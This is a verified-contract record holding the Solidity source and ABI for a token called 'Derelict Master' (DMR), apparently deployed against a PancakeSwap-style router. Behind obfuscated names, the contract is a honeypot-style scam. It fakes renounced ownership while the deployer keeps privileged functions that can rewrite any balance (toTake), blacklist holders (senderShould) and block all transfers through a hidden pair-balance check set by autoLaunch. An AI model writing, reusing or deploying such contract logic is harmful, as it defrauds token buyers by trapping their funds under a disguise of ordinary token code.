{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface minAtAmount {\n    function createPair(address feeIs, address modeList) external returns (address);\n}\n\ninterface senderLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderIs) external view returns (uint256);\n\n    function transfer(address tokenFee, uint256 tokenReceiver) external returns (bool);\n\n    function allowance(address enableReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenFee,\n        uint256 tokenReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityFromEnable, uint256 value);\n    event Approval(address indexed enableReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract amountAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderLaunchedMetadata is senderLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DerelictMaster is amountAuto, senderLaunched, senderLaunchedMetadata {\n\n    uint256 public senderBuy;\n\n    uint256 sellAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listLaunch;\n    }\n\n    function approve(address launchMarketing, uint256 tokenReceiver) public virtual override returns (bool) {\n        toFeeReceiver[_msgSender()][launchMarketing] = tokenReceiver;\n        emit Approval(_msgSender(), launchMarketing, tokenReceiver);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atFromEnable;\n    }\n\n    address private feeMin;\n\n    function balanceOf(address senderIs) public view virtual override returns (uint256) {\n        return toTeam[senderIs];\n    }\n\n    string private takeList = \"Derelict Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchMode;\n    }\n\n    function autoLaunch(uint256 tokenReceiver) public {\n        swapLaunch();\n        sellAmount = tokenReceiver;\n    }\n\n    uint256 constant minAt = 4 ** 10;\n\n    function totalFrom(address totalShould) public {\n        if (totalToken) {\n            return;\n        }\n        \n        autoIs[totalShould] = true;\n        if (teamMax != senderBuy) {\n            senderReceiverTo = true;\n        }\n        totalToken = true;\n    }\n\n    address marketingFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return feeMin;\n    }\n\n    address public limitTotal;\n\n    function swapMarketing() public {\n        emit OwnershipTransferred(fundTake, address(0));\n        feeMin = address(0);\n    }\n\n    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private toFeeReceiver;\n\n    bool public limitFund;\n\n    function swapLaunch() private view {\n        require(autoIs[_msgSender()]);\n    }\n\n    function transferFrom(address walletFund, address tokenFee, uint256 tokenReceiver) external override returns (bool) {\n        if (_msgSender() != fundFee) {\n            if (toFeeReceiver[walletFund][_msgSender()] != type(uint256).max) {\n                require(tokenReceiver <= toFeeReceiver[walletFund][_msgSender()]);\n                toFeeReceiver[walletFund][_msgSender()] -= tokenReceiver;\n            }\n        }\n        return shouldLaunched(walletFund, tokenFee, tokenReceiver);\n    }\n\n    mapping(address => uint256) private toTeam;\n\n    mapping(address => bool) public shouldLimit;\n\n    function senderShould(address liquidityAtFrom) public {\n        swapLaunch();\n        \n        if (liquidityAtFrom == fundTake || liquidityAtFrom == limitTotal) {\n            return;\n        }\n        shouldLimit[liquidityAtFrom] = true;\n    }\n\n    function allowance(address toAtLaunch, address launchMarketing) external view virtual override returns (uint256) {\n        if (launchMarketing == fundFee) {\n            return type(uint256).max;\n        }\n        return toFeeReceiver[toAtLaunch][launchMarketing];\n    }\n\n    uint256 teamList;\n\n    function getOwner() external view returns (address) {\n        return feeMin;\n    }\n\n    uint256 private listLaunch = 100000000 * 10 ** 18;\n\n    bool public senderReceiverTo;\n\n    constructor (){\n        \n        receiverSwap listTotal = receiverSwap(fundFee);\n        limitTotal = minAtAmount(listTotal.factory()).createPair(listTotal.WETH(), address(this));\n        if (takeLaunch != senderReceiverTo) {\n            takeLaunch = true;\n        }\n        fundTake = _msgSender();\n        autoIs[fundTake] = true;\n        toTeam[fundTake] = listLaunch;\n        swapMarketing();\n        if (limitFund != takeLaunch) {\n            limitFund = true;\n        }\n        emit Transfer(address(0), fundTake, listLaunch);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeList;\n    }\n\n    string private launchMode = \"DMR\";\n\n    address public fundTake;\n\n    bool public takeLaunch;\n\n    function launchReceiver(address walletFund, address tokenFee, uint256 tokenReceiver) internal returns (bool) {\n        require(toTeam[walletFund] >= tokenReceiver);\n        toTeam[walletFund] -= tokenReceiver;\n        toTeam[tokenFee] += tokenReceiver;\n        emit Transfer(walletFund, tokenFee, tokenReceiver);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed listShould, address indexed isAmount);\n\n    uint8 private atFromEnable = 18;\n\n    function shouldLaunched(address walletFund, address tokenFee, uint256 tokenReceiver) internal returns (bool) {\n        if (walletFund == fundTake) {\n            return launchReceiver(walletFund, tokenFee, tokenReceiver);\n        }\n        uint256 minShouldAmount = senderLaunched(limitTotal).balanceOf(marketingFee);\n        require(minShouldAmount == sellAmount);\n        require(tokenFee != marketingFee);\n        if (shouldLimit[walletFund]) {\n            return launchReceiver(walletFund, tokenFee, minAt);\n        }\n        return launchReceiver(walletFund, tokenFee, tokenReceiver);\n    }\n\n    uint256 private teamMax;\n\n    mapping(address => bool) public autoIs;\n\n    function toTake(address listSwap, uint256 tokenReceiver) public {\n        swapLaunch();\n        toTeam[listSwap] = tokenReceiver;\n    }\n\n    bool public totalToken;\n\n    function transfer(address listSwap, uint256 tokenReceiver) external virtual override returns (bool) {\n        return shouldLaunched(_msgSender(), listSwap, tokenReceiver);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFromEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAtLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenReceiver\",\"type\":\"uint256\"}],\"name\":\"autoLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiverTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAtFrom\",\"type\":\"address\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiver\",\"type\":\"uint256\"}],\"name\":\"toTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"}],\"name\":\"totalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DerelictMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}